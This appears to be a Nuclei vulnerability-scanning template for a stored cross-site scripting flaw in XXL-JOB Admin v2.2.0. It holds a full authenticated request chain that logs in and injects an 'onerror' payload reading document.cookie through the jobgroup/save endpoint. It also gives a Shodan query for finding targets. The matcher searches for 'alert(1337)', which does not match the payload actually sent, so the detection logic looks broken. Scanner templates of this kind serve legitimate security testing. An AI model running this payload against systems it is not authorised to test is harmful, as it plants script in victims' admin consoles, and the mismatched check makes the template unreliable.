id: xxl-job-stored-xss

info:
  name: XXL-JOB v2.2.0 jobgroup/save+pageList â€” Stored XSS
  author: Sourabh-Sahu
  severity: medium
  description: |
    XXL-JOB Admin version 2.2.0 was exploited to trigger a stored XSS via jobgroup/save.The issue was verified through jobgroup/pageList.
  reference:
    - https://github.com/xuxueli/xxl-job/issues/1866
  metadata:
    verified: true
    max-request: 3
    shodan-query: html:"/xxl-job-admin/static/favicon.ico"
  tags: xxl-job,xss,authenticated

variables:
  username: "{{username}}"
  password: "{{password}}"
  title: "{{to_lower(rand_base(6))}}"

http:
  - raw:
      - |
        POST /xxl-job-admin/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: {{RootURL}}
        Referer: {{RootURL}}/xxl-job-admin/toLogin
        X-Requested-With: XMLHttpRequest

        userName={{username}}&password={{password}}

      - |
        POST /xxl-job-admin/jobgroup/save HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: {{RootURL}}
        Referer: {{RootURL}}/xxl-job-admin/jobgroup
        X-Requested-With: XMLHttpRequest

        appname={{title}}&title={{title}}&addressType=1&addressList=<img src=# onerror=\"alert(document.cookie)\" />

      - |
        POST /xxl-job-admin/jobgroup/pageList HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: {{RootURL}}
        Referer: {{RootURL}}/xxl-job-admin/jobgroup
        X-Requested-With: XMLHttpRequest

        start=0&length=100

    matchers:
      - type: word
        part: body
        words:
          - "<img src=# onerror=\\\"alert(1337)\\\" />"

      - type: status
        status:
          - 200
